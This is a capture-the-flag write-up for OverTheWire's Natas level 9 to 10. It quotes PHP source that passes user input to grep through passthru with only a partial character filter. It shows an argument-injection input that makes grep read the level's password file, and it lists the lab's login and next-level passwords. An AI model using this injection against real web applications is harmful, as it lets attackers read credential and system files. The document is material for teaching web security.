# Natas 9 - Natas 10
    Username  : natas10
    Password  : t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
    URL       : http://natas10.natas.labs.overthewire.org
# Solution 

In the source of this web page we can see that
```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```
Now it filtering out the unwanted characters . So we can not injection  our code into the input box 

grep command is used find a word in a file 

        grep -i a file1.txt file2.txt
        
In the above command , the grep searches the word " a "  in both file1 and  file2 .

So we can inject 

        a /etc/natas_webpass/natas11 
which runs as

    grep -i a /etc/natas_webpass/natas11 dictionary.txt 

# Password
     UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

        
